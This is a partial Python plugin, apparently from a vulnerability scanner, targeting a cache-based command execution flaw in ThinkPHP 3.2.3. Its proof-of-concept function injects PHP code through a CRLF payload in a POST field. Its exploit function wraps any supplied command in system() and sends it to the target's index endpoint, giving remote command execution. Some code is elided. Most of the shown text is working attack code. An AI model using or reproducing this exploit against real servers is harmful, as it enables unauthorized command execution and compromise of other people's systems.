...
def vuln_info():
    info={
        'vuln_name': 'Thinkphp 3.2.3 缓存命令执行',  #漏洞名称
...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        ...
        rp = requests.post(url+"/index.php/Home/Index/index.html",data="a3=%0d%0avar_dump(xiaohei);%0d%0a//",headers=heads,verify=False)
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        ...
        if exp_data['type']=='cmd':
            rp = requests.post(url+"/index.php/Home/Index/index.html",data="a3=%0d%0asystem("+exp_data['command']+");%0d%0a//",headers=heads,verify=False)
            if  rp.text!="":
                    result['Result'] = True
